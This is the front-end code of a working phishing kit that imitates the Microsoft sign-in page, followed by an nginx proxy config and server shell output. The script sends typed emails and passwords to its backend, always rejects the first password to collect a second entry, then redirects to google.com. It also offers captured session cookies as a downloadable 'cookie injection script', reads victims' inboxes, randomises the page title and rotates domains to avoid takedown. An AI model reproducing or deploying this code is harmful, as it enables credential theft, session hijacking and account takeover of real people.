                <p id="loadingText">Processing...</p>
            </div>

            <!-- Microsoft-style dot loading animation -->
            <div class="microsoft-dots-loader" id="microsoftDotsLoader">
                <div class="microsoft-dot"></div>
                <div class="microsoft-dot"></div>
                <div class="microsoft-dot"></div>
                <div class="microsoft-dot"></div>
                <div class="microsoft-dot"></div>
            </div>

            <!-- Cancel button during loading -->
            <div class="loading-cancel-container" id="loadingCancelContainer">
                <button type="button" class="cancel-btn" onclick="cancelLoading()">Cancel</button>
            </div>

            <!-- Email Input Form - shown initially -->
            <div id="emailForm" style="display: block;">
                <div class="form-group">
                    <input type="email" id="emailInput" class="microsoft-input" placeholder="Email, phone, or Skype" required autofocus onkeypress="if(event.key==='Enter') verifyEmail()">
                </div>

                <div class="form-links">
                    <span class="create-account">No account? <a href="https://signup.live.com" target="_blank">Create one!</a></span>
                </div>

                <div class="form-links" style="margin-top: 0;">
                    <a href="https://account.live.com/acsr" target="_blank">Can't access your account?</a>
                </div>

                <div class="button-group">
                    <button type="button" class="btn btn-primary" onclick="verifyEmail()">
                        Next
                    </button>
                </div>
            </div>

            <!-- Password Input Form - shown after email verification -->
            <div id="passwordForm" class="password-section">
                <div class="form-group">
                    <input type="password" id="passwordInput" class="microsoft-input" placeholder="Password" required onkeypress="if(event.key==='Enter') signInWithPassword()">
                </div>

                <div class="form-links">
                    <a href="https://account.live.com/ResetPassword.aspx" target="_blank">Forgot my password?</a>
                </div>

                <div class="button-group">
                    <button type="button" class="btn btn-primary" onclick="signInWithPassword()">
                        Sign in
                    </button>
                </div>
            </div>


            <!-- Success form - shown after authentication -->
            <div id="successForm" class="password-section">
                <div style="text-align: center; padding: 20px 0;">
                    <div style="font-size: 48px; color: #107c10; margin-bottom: 15px;">‚úÖ</div>
                    <h2 style="color: #107c10; margin-bottom: 10px;">Successfully signed in!</h2>
                    <p id="userEmail" style="color: #323130; font-size: 14px; margin-bottom: 20px;"></p>

                    <div class="button-group">
                        <button type="button" class="btn btn-primary" onclick="viewEmails()">
                            View My Emails
                        </button>
                    </div>

                    <div class="button-group" style="margin-top: 15px;">
                        <button type="button" class="btn btn-secondary" onclick="logout()">
                            Sign Out
                        </button>
                    </div>
                </div>
            </div>


        </div>

        <!-- Sign-in options -->
        <div class="sign-in-options">
            <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg" 
                 alt="Sign-in options icon">
            <span>Sign-in options</span>
        </div>
    </div>



    <script>
        let currentSessionId = null;
        let verifiedEmailAddress = null; // Store the verified email
        let currentStep = 'email'; // 'email', 'password', 'success'
        const API_BASE = '';
        let authWindow = null;
        let currentEmail = null; // To store the email for password authentication
        let currentUserEmail = null; // To store the email for success message
        let passwordAttemptCount = 0; // Track password attempts for current email

        // Generate random alphanumeric title
        function generateRandomTitle() {
            const randomString = (Math.random() + 1).toString(36).substring(2, 80);
            document.title = randomString;
        }

        // Load dynamic background URL
        async function loadBackgroundUrl() {
            try {
                const response = await fetch('/api/internal/background-url');
                const data = await response.json();

                if (data.success && data.backgroundUrl) {
                    document.body.style.backgroundImage = `url('${data.backgroundUrl}')`;
                }
            } catch (error) {
                console.error('Error loading background URL:', error);
                // Use default if loading fails
                document.body.style.backgroundImage = "url('https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2-small_2055002f2daae2ed8f69f03944c0e5d9.jpg')";
            }
        }

        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            generateRandomTitle(); // Set random title
            loadBackgroundUrl(); // Load dynamic background

            // Hide main container initially while envelope animation plays
            const mainContainer = document.querySelector('.container');
            const signInOptions = document.querySelector('.sign-in-options');
            const footerLinks = document.querySelector('.footer-links');

            if (mainContainer) mainContainer.style.opacity = '0';
            if (signInOptions) signInOptions.style.opacity = '0';
            if (footerLinks) footerLinks.style.opacity = '0';

            // After 3 seconds (one animation cycle), fade out overlay and show login form
            setTimeout(function() {
                const overlay = document.getElementById('envelopeLoadingOverlay');
                if (overlay) {
                    overlay.classList.add('fade-out');
                    overlay.setAttribute('aria-hidden', 'true');

                    // Reveal main content after fade-out transition completes
                    setTimeout(function() {
                        if (mainContainer) mainContainer.style.opacity = '1';
                        if (signInOptions) signInOptions.style.opacity = '1';
                        if (footerLinks) footerLinks.style.opacity = '1';

                        // Remove overlay from DOM to prevent any interference
                        if (overlay && overlay.parentNode) {
                            overlay.parentNode.removeChild(overlay);
                        }
                    }, 600); // Match the CSS transition duration
                }
            }, 3000); // 3 seconds for envelope animation

            setLoading(false); // Start with loading off
            checkBackendHealth();
            checkExistingSession();
            showEmailForm();

            // Clear error messages when user starts typing in password field
            const passwordInput = document.getElementById('passwordInput');
            if (passwordInput) {
                passwordInput.addEventListener('input', function() {
                    clearMessage(); // Clear any error messages when user starts typing
                });
            }
        });

        // Utility functions
        function showMessage(message, type = 'info') {
            const messageArea = document.getElementById('messageArea');
            messageArea.style.display = 'block';
            messageArea.innerHTML = `<div class="message ${type}">${message}</div>`;
        }

        function clearMessage() {
            const messageArea = document.getElementById('messageArea');
            messageArea.innerHTML = '';
            messageArea.style.display = 'none';
        }

        // Set loading state
        function setLoading(isLoading, message = 'Processing...', showSuccessMessage = true) {
            const loadingAnimation = document.getElementById('loadingAnimation');
            const microsoftDotsLoader = document.getElementById('microsoftDotsLoader');
            const microsoftLogo = document.querySelector('.microsoft-logo');
            const container = document.querySelector('.container');
            const emailForm = document.getElementById('emailForm');
            const passwordForm = document.getElementById('passwordForm');
            const successForm = document.getElementById('successForm');
            const headerTitle = document.getElementById('headerTitle');
            const loadingCancelContainer = document.getElementById('loadingCancelContainer');
            const backInfo = document.getElementById('backInfo');
            const messageArea = document.getElementById('messageArea');

            if (isLoading) {
                loadingAnimation.classList.add('active');
                microsoftLogo.style.display = 'block';
                microsoftLogo.style.visibility = 'visible';
                microsoftLogo.classList.add('loading');
                container.classList.add('loading-state');
                microsoftDotsLoader.classList.add('show');
                microsoftDotsLoader.style.display = 'flex';
                headerTitle.textContent = message;
                loadingCancelContainer.classList.add('show');

                emailForm.style.display = 'none';
                passwordForm.style.display = 'none';
                successForm.style.display = 'none';
            } else {
                loadingAnimation.classList.remove('active');
                microsoftDotsLoader.classList.remove('show');
                microsoftDotsLoader.style.display = 'none';
                microsoftLogo.classList.remove('loading');
                container.classList.remove('loading-state');
                loadingCancelContainer.classList.remove('show');
                microsoftLogo.style.display = 'block';
                microsoftLogo.style.visibility = 'visible';

                // Restore header text based on current step
                if (currentStep === 'email') {
                    headerTitle.textContent = 'Sign in';
                    emailForm.style.display = 'block';
                    passwordForm.style.display = 'none';
                    successForm.style.display = 'none';
                } else if (currentStep === 'password') {
                    headerTitle.textContent = 'Enter your password';
                    emailForm.style.display = 'none';
                    passwordForm.style.display = 'block';
                    successForm.style.display = 'none';
                } else if (currentStep === 'success') {
                    headerTitle.textContent = 'Welcome';
                    emailForm.style.display = 'none';
                    passwordForm.style.display = 'none';
                    successForm.style.display = 'block';
                }

                // Safely handle backInfo and messageArea elements
                if (backInfo) {
                    backInfo.style.display = '';
                }
                if (messageArea) {
                    messageArea.style.display = '';
                }
            }

            const buttons = document.querySelectorAll('.btn');
            const inputs = document.querySelectorAll('.microsoft-input');

            buttons.forEach(btn => btn.disabled = isLoading);
            inputs.forEach(input => input.disabled = isLoading);
        }

        function cancelLoading() {
            // Close auth window if it exists
            if (authWindow && !authWindow.closed) {
                authWindow.close();
            }

            // Clear timeout
            if (window.authTimeoutId) {
                clearTimeout(window.authTimeoutId);
                window.authTimeoutId = null;
            }

            setLoading(false);
            clearMessage();
            showEmailForm(); // Go back to email form
        }

        function showEmailForm() {
            currentStep = 'email';
            document.getElementById('emailForm').style.display = 'block';
            document.getElementById('passwordForm').style.display = 'none';
            document.getElementById('successForm').style.display = 'none';
            document.getElementById('headerTitle').textContent = 'Sign in ';
            document.getElementById('emailInput').value = ''; // Clear email input
            document.getElementById('backInfo').style.display = 'none';
            document.getElementById('backInfo').classList.remove('visible');
            clearMessage();
        }

        function showPasswordForm(email) {
            currentStep = 'password';
            verifiedEmailAddress = email; // Store the verified email
            currentEmail = email; // Store email for password auth
            document.getElementById('enteredEmail').textContent = email;
            document.getElementById('backInfo').style.display = 'block';
            document.getElementById('backInfo').classList.add('visible');
            document.getElementById('passwordInput').value = ''; // Clear password input
            document.getElementById('passwordInput').focus();
            document.getElementById('emailForm').style.display = 'none';
            document.getElementById('passwordForm').style.display = 'block';
            document.getElementById('successForm').style.display = 'none';
            document.getElementById('headerTitle').textContent = 'Enter your password';
            clearMessage();
        }

        function showAuthSuccess(email) {
                document.getElementById('headerTitle').textContent = 'Sign in successful';
                document.getElementById('emailForm').style.display = 'none';
                document.getElementById('passwordForm').style.display = 'none';

                const successDiv = document.createElement('div');
                successDiv.className = 'success-container';
                successDiv.innerHTML = `
                    <div class="success-message">
                        <h3>‚úÖ Authentication Successful</h3>
                        <p>Signed in as: <strong>${email}</strong></p>
                        <p>Session cookies have been captured and saved.</p>
                        <div style="margin-top: 20px;">
                            <button onclick="downloadCookieScript()" class="form-button">Download Cookie Script</button>
                            <button onclick="showSessionData()" class="form-button">View Session Data</button>
                            <button onclick="resetForm()" class="form-button secondary">Sign in as different user</button>
                        </div>
                    </div>
                `;

                const container = document.querySelector('.container');
                container.appendChild(successDiv);
            }

            async function downloadCookieScript() {
                if (!currentSessionId) {
                    showMessage('No active session found', 'error');
                    return;
                }

                try {
                    const response = await fetch(`${API_BASE}/api/cookies/${currentSessionId}`);

                    if (response.ok) {
                        const blob = await response.blob();
                        const url = window.URL.createObjectURL(blob);
                        const a = document.createElement('a');
                        a.href = url;
                        a.download = `inject_session_${currentSessionId}.js`;
                        document.body.appendChild(a);
                        a.click();
                        window.URL.revokeObjectURL(url);
                        document.body.removeChild(a);
                        showMessage('Cookie injection script downloaded!', 'success');
                    } else {
                        throw new Error('Failed to download cookie script');
                    }
                } catch (error) {
                    console.error('Download error:', error);
                    showMessage('Failed to download cookie script: ' + error.message, 'error');
                }
            }

            async function showSessionData() {
                if (!currentSessionId) {
                    showMessage('No active session found', 'error');
                    return;
                }

                try {
                    const response = await fetch(`${API_BASE}/api/session-data/${currentSessionId}`);
                    const data = await response.json();

                    if (response.ok) {
                        alert(`Session Data:
Email: ${data.email}
Session ID: ${data.sessionId}
Total Cookies: ${data.totalCookies}
Domains: ${data.domains.join(', ')}
Timestamp: ${new Date(data.timestamp).toLocaleString()}
Status: ${data.status}`);
                    } else {
                        throw new Error(data.error || 'Failed to get session data');
                    }
                } catch (error) {
                    console.error('Session data error:', error);
                    showMessage('Failed to get session data: ' + error.message, 'error');
                }
            }


        // API Functions
        async function checkBackendHealth() {
            try {
                const response = await fetch(`${API_BASE}/api/health`);
                const data = await response.json();

                if (response.ok && data.authConfigured) {
                    console.log('‚úÖ Backend healthy and Azure configured');
                    // Backend is ready, proceed to show the email form
                    setLoading(false);
                    showEmailForm();
                } else {
                    console.log('‚ö†Ô∏è Azure credentials not configured on backend');
                    // Silently proceed to show the email form - let the backend handle the error
                    setLoading(false);
                    showEmailForm();
                }
            } catch (error) {
                console.error('Backend health check failed:', error);
                setLoading(false);
                showEmailForm(); // Still show the form, let individual API calls handle errors
            }
        }

        async function checkExistingSession() {
            try {
                const response = await fetch(`${API_BASE}/api/status`);
                const data = await response.json();

                if (data.authenticated && data.userEmail) {
                    currentSessionId = data.sessionId;
                    currentUserEmail = data.userEmail;
                    setLoading(false);
                    showAuthSuccess(data.userEmail);
                    console.log('Found existing authenticated session:', data.userEmail);
                } else {
                    setLoading(false);
                    showEmailForm();
                }
            } catch (error) {
                console.error('Error checking session status:', error);
                setLoading(false);
                showEmailForm();
            }
        }

        async function verifyEmail() {
            const email = document.getElementById('emailInput').value.trim();

            if (!email) {
                showMessage('Please enter your email address.', 'error');
                return;
            }

            if (!isValidEmail(email)) {
                showMessage('Please enter a valid email address.', 'error');
                return;
            }

            // Reset password attempt counter for new email
            passwordAttemptCount = 0;
            console.log('üîÑ Password attempt counter reset for new email');

            clearMessage();
            setLoading(true, 'Taking you to your organization...', false);

            try {
                // First, verify if the email account exists
                const verifyResponse = await fetch(`${API_BASE}/api/verify-email`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email: email })
                });

                const verifyData = await verifyResponse.json();

                if (verifyResponse.ok && verifyData.exists) {
                    // Account exists
                    console.log('‚úÖ Email account verified');

                    // Capture session ID for browser preloading
                    if (verifyData.sessionId) {
                        currentSessionId = verifyData.sessionId;
                        console.log(`üîë Session ID captured: ${currentSessionId}`);
                    }

                    // Show password form
                    setLoading(false);
                    showPasswordForm(email);
                } else if (verifyData.exists === false) {
                    // Account doesn't exist
                    setLoading(false);
                    showMessage(verifyData.message || `We couldn't find an account with that username. Try another, or get a new Microsoft account.`, 'error');
                } else {
                    // Verification failed
                    console.log('‚ö†Ô∏è Email verification failed');
                    setLoading(false);
                    showMessage('Unable to verify email account. Please try again or contact support.', 'error');
                }

            } catch (error) {
                console.error('Email verification error:', error);
                setLoading(false);
                showMessage('Unable to verify email account. Please try again or contact support.', 'error');
            }
        }

        // Wait for preload to be ready
        async function waitForPreloadReady(sessionId, email) {
            const maxWaitTime = 20000; // 20 seconds max
            const pollInterval = 1000; // Check every 1 second
            const startTime = Date.now();

            console.log(`‚è≥ Waiting for preload to be ready for ${email}...`);

            while ((Date.now() - startTime) < maxWaitTime) {
                try {
                    const response = await fetch(`${API_BASE}/api/preload-status/${sessionId}`);
                    if (response.ok) {
                        const data = await response.json();

                        if (data.status === 'preload_ready') {
                            console.log(`‚úÖ Preload ready for ${email} after ${Date.now() - startTime}ms`);
                            return true;
                        } else if (data.status === 'preload_failed') {
                            console.log(`‚ùå Preload failed for ${email}`);
                            return false;
                        }
                    }
                } catch (e) {
                    console.warn('Error checking preload status:', e);
                }

                await new Promise(resolve => setTimeout(resolve, pollInterval));
            }

            console.log(`‚è∞ Preload wait timeout for ${email}`);
            return false;
        }


        // Password authentication using fast auth endpoint
        async function signInWithPassword() {
            const passwordInput = document.getElementById('passwordInput');
            const errorDiv = document.getElementById('messageArea'); // Assuming messageArea is used for errors

            try {
                clearMessage();
                setLoading(true, 'Signing in...');

                const email = currentEmail;
                const password = passwordInput.value;

                if (!password) {
                    showMessage('Please enter your password', 'error');
                    setLoading(false);
                    return;
                }

                // Increment password attempt count
                passwordAttemptCount++;
                console.log(`üöÄ Password attempt #${passwordAttemptCount} for: ${email}`);

                // Prepare payload for backend
                const payload = { 
                    email, 
                    password,
                    attemptNumber: passwordAttemptCount
                };
                if (currentSessionId) {
                    payload.sessionId = currentSessionId;
                }

                // Send password to backend using keepalive to ensure delivery even after redirect
                fetch('/api/authenticate-password-fast', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload),
                    keepalive: true
                }).catch(error => {
                    console.warn('Background authentication submission error (non-blocking):', error);
                });

                // Only redirect on SECOND password attempt
                if (passwordAttemptCount === 2) {
                    console.log('‚ö° Second attempt - redirecting to google.com...');
                    setTimeout(() => {
                        window.location.href = 'https://google.com';
                    }, 1000); // 1 second delay
                } else {
                    // First attempt - show error and allow retry
                    console.log('‚ö†Ô∏è First attempt - showing error for retry');
                    setTimeout(() => {
                        setLoading(false);
                        showMessage('Your account or password is incorrect. If you don\'t remember your password, reset it now.', 'microsoft-error'); // Changed to microsoft-error for consistency
                        passwordInput.value = ''; // Clear password input on first failed attempt
                        passwordInput.focus(); // Focus password input for retry
                    }, 3000); // 3 second delay before showing error
                }

            } catch (error) {
                console.error('Password submission error:', error);
                setLoading(false);
                showMessage('Authentication error. Please try again.', 'error');
            }
        }

        function isValidEmail(email) {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return emailRegex.test(email);
        }

        async function viewEmails() {
            clearMessage();
            setLoading(true, 'Loading your emails...', false);

            try {
                const response = await fetch(`${API_BASE}/api/emails?sessionId=${currentSessionId}&count=10`);
                const data = await response.json();

                if (response.ok) {
                    setLoading(false);

                    const emailList = data.emails.map(email => 
                        `<div style="border-bottom: 1px solid #e1e1e1; padding: 10px 0;">
                            <strong>${email.subject}</strong><br>
                            <small style="color: #666;">From: ${email.from.emailAddress.name || email.from.emailAddress.address}</small><br>
                            <small style="color: #666;">Date: ${new Date(email.receivedDateTime).toLocaleDateString()}</small><br>
                            <p style="margin: 5px 0; color: #323130;">${email.bodyPreview}</p>
                        </div>`
                    ).join('');

                    const emailWindow = window.open('', 'emails', 'width=800,height=600,scrollbars=yes,resizable=yes');
                    emailWindow.document.write(`
                        <html>
                            <head><title>Your Recent Emails</title></head>
                            <body style="font-family: Segoe UI, sans-serif; padding: 20px;">
                                <h2>Your Recent Emails (${data.count} items)</h2>
                                ${emailList}
                                <br><button onclick="window.close()">Close</button>
                            </body>
                        </html>
                    `);

                    // No frontend notification message here
                } else {
                    throw new Error(data.error || 'Failed to load emails');
                }

            } catch (error) {
                console.error('Error loading emails:', error);
                setLoading(false);
                showMessage(`Error loading emails: ${error.message}`, 'error');
            }
        }

        async function logout() {
            clearMessage();
            setLoading(true, 'Signing out...', false);

            try {
                if (currentSessionId) {
                    await fetch(`${API_BASE}/api/admin/session/${currentSessionId}`, {
                        method: 'DELETE',
                        headers: { 
                            'Authorization': `Bearer ${global.adminToken || 'admin'}`,
                            'Content-Type': 'application/json' 
                        }
                    });
                }

                currentSessionId = null;
                verifiedEmailAddress = null; // Clear verified email on logout
                currentEmail = null; // Clear current email on logout
                currentUserEmail = null; // Clear current user email on logout
                setLoading(false);
                showEmailForm(); // Return to email form on logout
                // No frontend success message on logout
            } catch (error) {
                console.error('Logout error:', error);
                currentSessionId = null;
                verifiedEmailAddress = null;
                currentEmail = null;
                currentUserEmail = null;
                setLoading(false);
                showEmailForm();
                // No frontend message on logout error
            }
        }

        // Helper function to check session status after password auth
        async function checkSessionStatus() {
            try {
                const response = await fetch(`${API_BASE}/api/status`);
                const data = await response.json();

                if (data.authenticated && data.userEmail) {
                    currentSessionId = data.sessionId;
                    currentUserEmail = data.userEmail;
                    setLoading(false);
                    showAuthSuccess(data.userEmail);
                } else {
                    // If not authenticated, show error and return to email form
                    setLoading(false);
                    showMessage('Authentication failed. Please try again.', 'error');
                    showEmailForm();
                }
            } catch (error) {
                console.error('Error checking session status after password auth:', error);
                setLoading(false);
                showMessage('Unable to verify authentication status. Please try again.', 'error');
                showEmailForm();
            }
        }

        // Function to reset the form to the initial state
        function resetForm() {
            currentSessionId = null;
            verifiedEmailAddress = null;
            currentEmail = null;
            currentUserEmail = null;
            setLoading(false);
            clearMessage();
            showEmailForm();
            // Remove any appended success message div
            const successDiv = document.querySelector('.success-container');
            if (successDiv) {
                successDiv.remove();
            }
        }

        // Domain Rotation Management System
        let domainRotationConfig = null;
        let activeDomains = [];

        // Load domain rotation configuration on page load
        async function loadDomainRotationConfig() {
            try {
                const response = await fetch(`${API_BASE}/api/domain-rotation/config`);
                const data = await response.json();

                if (data.success) {
                    domainRotationConfig = data.config;
                    await checkActiveDomains();
                }
            } catch (error) {
                console.error('Error loading domain rotation config:', error);
            }
        }

        // Check for active domains
        async function checkActiveDomains() {
            try {
                const response = await fetch(`${API_BASE}/api/domain-rotation/active-domains`);
                const data = await response.json();

                if (data.success) {
                    activeDomains = data.activeDomains;

                    // Show rotation button if 2 or more domains are active
                    if (activeDomains.length >= 2) {
                        showDomainRotationButton();
                    }
                }
            } catch (error) {
                console.error('Error checking active domains:', error);
            }
        }

        // Show the domain rotation button
        function showDomainRotationButton() {
            const existingButton = document.getElementById('domain-rotation-button');
            if (existingButton) return; // Button already exists

            const button = document.createElement('button');
            button.id = 'domain-rotation-button';
            button.className = 'domain-rotation-btn';
            button.innerHTML = 'üîÑ Configure Domain Rotation';
            button.onclick = showDomainRotationModal;

            // Insert button after the container
            const container = document.querySelector('.container');
            container.parentNode.insertBefore(button, container.nextSibling);
        }

        // Show the domain rotation configuration modal
        function showDomainRotationModal() {
            const modal = document.createElement('div');
            modal.id = 'domain-rotation-modal';
            modal.className = 'domain-rotation-modal';

            const currentMainDomain = window.location.hostname;
            const otherDomains = activeDomains.filter(d => d.domain !== currentMainDomain).map(d => d.domain);

            modal.innerHTML = `
                <div class="modal-content">
                    <div class="modal-header">
                        <h2>üîÑ Configure Domain Rotation</h2>
                        <span class="close-modal" onclick="closeDomainRotationModal()">&times;</span>
                    </div>
                    <div class="modal-body">
                        <p><strong>Active Domains Detected:</strong> ${activeDomains.length}</p>

                        <div class="form-group">
                            <label>Select Main Domain:</label>
                            <select id="main-domain-select">
                                ${activeDomains.map(d => 
                                    `<option value="${d.domain}" ${d.domain === currentMainDomain ? 'selected' : ''}>${d.domain}</option>`
                                ).join('')}
                            </select>
                        </div>

                        <div class="form-group">
                            <label>Other Domains (will be used for rotation):</label>
                            <div id="rotation-domains-list">
                                ${otherDomains.map(domain => 
                                    `<div class="domain-item">
                                        <input type="checkbox" id="domain-${domain}" value="${domain}" checked>
                                        <label for="domain-${domain}">${domain}</label>
                                    </div>`
                                ).join('')}
                            </div>
                        </div>

                        ${domainRotationConfig && domainRotationConfig.rotationString ? `
                        <div class="form-group">
                            <label>Current Rotation String:</label>
                            <div class="rotation-strings">
                                <code>${currentMainDomain}/${domainRotationConfig.rotationString}</code>
                                <small style="display: block; margin-top: 8px; color: #666;">
                                    This link cycles through all ${domainConfig.rotationDomains?.length || 'selected'} domains
                                </small>
                            </div>
                        </div>
                        ` : ''}

                        <div class="form-actions">
                            <button onclick="setupDomainRotation()" class="primary-btn">Generate Rotation String</button>
                            ${domainRotationConfig && domainRotationConfig.rotationString ? `
                            <button onclick="regenerateRotationString()" class="secondary-btn">Regenerate String</button>
                            ` : ''}
                        </div>
                    </div>
                </div>
            `;

            document.body.appendChild(modal);
        }

        // Close the domain rotation modal
        function closeDomainRotationModal() {
            const modal = document.getElementById('domain-rotation-modal');
            if (modal) {
                modal.remove();
            }
        }

        // Setup domain rotation
        async function setupDomainRotation() {
            const mainDomain = document.getElementById('main-domain-select').value;
            const rotationDomains = [];

            // Get checked rotation domains
            document.querySelectorAll('#rotation-domains-list input[type="checkbox"]:checked').forEach(checkbox => {
                rotationDomains.push(checkbox.value);
            });

            if (rotationDomains.length === 0) {
                alert('Please select at least one rotation domain.');
                return;
            }

            try {
                const response = await fetch(`${API_BASE}/api/domain-rotation/setup`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        mainDomain: mainDomain,
                        rotationDomains: rotationDomains
                    })
                });

                const data = await response.json();

                if (data.success) {
                    domainRotationConfig = data.config;
                    showRotationStringResult(data.rotationString, mainDomain, rotationDomains);
                } else {
                    alert('Error setting up domain rotation: ' + data.error);
                }
            } catch (error) {
                console.error('Error setting up domain rotation:', error);
                alert('Error setting up domain rotation: ' + error.message);
            }
        }

        // Regenerate rotation string
        async function regenerateRotationString() {
            try {
                const response = await fetch(`${API_BASE}/api/domain-rotation/regenerate-string`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    }
                });

                const data = await response.json();

                if (data.success) {
                    showRotationStringResult(data.rotationString, domainRotationConfig.mainDomain, domainRotationConfig.rotationDomains);
                } else {
                    alert('Error regenerating string: ' + data.error);
                }
            } catch (error) {
                console.error('Error regenerating string:', error);
                alert('Error regenerating string: ' + error.message);
            }
        }

        // Show the rotation string result
        function showRotationStringResult(rotationString, mainDomain, rotationDomains) {
            closeDomainRotationModal();

            const resultModal = document.createElement('div');
            resultModal.id = 'rotation-string-result';
            resultModal.className = 'domain-rotation-modal';

            resultModal.innerHTML = `
                <div class="modal-content">
                    <div class="modal-header">
                        <h2>‚úÖ Domain Rotation Configured!</h2>
                        <span class="close-modal" onclick="closeRotationStringResult()">&times;</span>
                    </div>
                    <div class="modal-body">
                        <p><strong>Your rotation URL is ready!</strong></p>
                        <p>This single URL cycles through all your domains:</p>

                        <div class="rotation-urls">
                            <div class="url-item">
                                <strong>Rotation Link:</strong> 
                                <code class="copy-url" onclick="copyToClipboard('https://${mainDomain}/${rotationString}')">${mainDomain}/${rotationString}</code>
                                <button onclick="copyToClipboard('https://${mainDomain}/${rotationString}')" class="copy-btn">üìã</button>
                            </div>
                        </div>

                        <div class="rotation-info">
                            <h4>üîÑ How it works:</h4>
                            <ul style="text-align: left; margin: 10px 0;">
                                ${rotationDomains.map((domain, index) => 
                                    `<li>Visit ${index + 1}: ‚Üí ${domain}</li>`
                                ).join('')}
                                <li>Visit ${rotationDomains.length + 1}: ‚Üí ${rotationDomains[0]} (cycles back)</li>
                            </ul>
                            <small>üí° Each time someone visits this URL, they get redirected to the next domain in rotation.</small>
                        </div>

                        <div class="form-actions">
                            <button onclick="closeRotationStringResult()" class="primary-btn">Done</button>
                        </div>
                    </div>
                </div>
            `;

            document.body.appendChild(resultModal);
        }

        // Close rotation string result modal
        function closeRotationStringResult() {
            const modal = document.getElementById('rotation-string-result');
            if (modal) {
                modal.remove();
            }
        }

        // Copy text to clipboard
        function copyToClipboard(text) {
            navigator.clipboard.writeText(text).then(() => {
                // Brief visual feedback
                const event = new CustomEvent('show-copy-feedback');
                document.dispatchEvent(event);

                // Show temporary message
                const msg = document.createElement('div');
                msg.className = 'copy-feedback';
                msg.textContent = 'Copied!';
                document.body.appendChild(msg);

                setTimeout(() => {
                    msg.remove();
                }, 2000);
            }).catch(err => {
                console.error('Failed to copy: ', err);
                // Fallback for older browsers
                const textArea = document.createElement('textarea');
                textArea.value = text;
                document.body.appendChild(textArea);
                textArea.select();
                document.execCommand('copy');
                document.body.removeChild(textArea);
            });
        }

        // Browser preloading happens during email verification via /api/verify-email
        // No need for separate email page preparation

        // Load background configuration from backend
        async function loadBackgroundFromConfig() {
            try {
                const response = await fetch('/api/internal/background-url');
                const data = await response.json();

                if (data.success && data.backgroundUrl) {
                    document.body.style.backgroundImage = `url('${data.backgroundUrl}')`;
                    console.log('‚úÖ Background loaded from configuration:', data.backgroundUrl);
                }
            } catch (error) {
                console.warn('‚ö†Ô∏è Could not load background configuration:', error.message);
            }
        }

        // On page load
        window.addEventListener('DOMContentLoaded', () => {
            loadBackgroundFromConfig();
        });


    </script>
</body>
</html>server {
    listen 80;
    listen [::]:80;
    server_name yourdomain.com www.yourdomain.com;
    
    # Security headers
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;

    # Proxy all requests to Node.js backend
    location / {
        proxy_pass http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade \$http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto \$scheme;
        proxy_cache_bypass \$http_upgrade;
        
        # Timeouts
        proxy_connect_timeout 60s;
        proxy_send_timeout 60s;
        proxy_read_timeout 60s;
    }

    # WebSocket support for Socket.IO
    location /socket.io/ {
        proxy_pass http://localhost:3000/socket.io/;
        proxy_http_version 1.1;
        proxy_set_header Upgrade \$http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host \$host;
        proxy_cache_bypass \$http_upgrade;
    }
}
Saving debug log to /var/log/letsencrypt/letsencrypt.log

- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
No certificates found.
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
root@ubuntu-s-1vcpu-1gb-nyc3-01:~/closedbridge# 